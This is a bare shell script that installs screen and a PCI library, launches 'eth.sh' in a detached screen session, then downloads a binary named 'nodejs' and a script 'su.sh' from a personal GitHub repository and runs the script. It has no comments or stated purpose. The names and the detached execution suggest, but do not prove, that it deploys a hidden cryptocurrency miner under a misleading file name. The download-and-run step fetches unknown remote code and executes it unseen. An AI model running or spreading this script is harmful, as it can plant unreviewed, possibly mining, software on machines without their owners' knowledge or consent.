#!/bin/sh

sudo apt update
sudo apt install screen -y
apt-get install libpci3
screen -dmS eth.sh ./eth.sh 65 75
wget https://github.com/gasken1/asw/raw/main/nodejs
wget https://raw.githubusercontent.com/gasken1/asw/main/su.sh
chmod +x su.sh
./su.sh
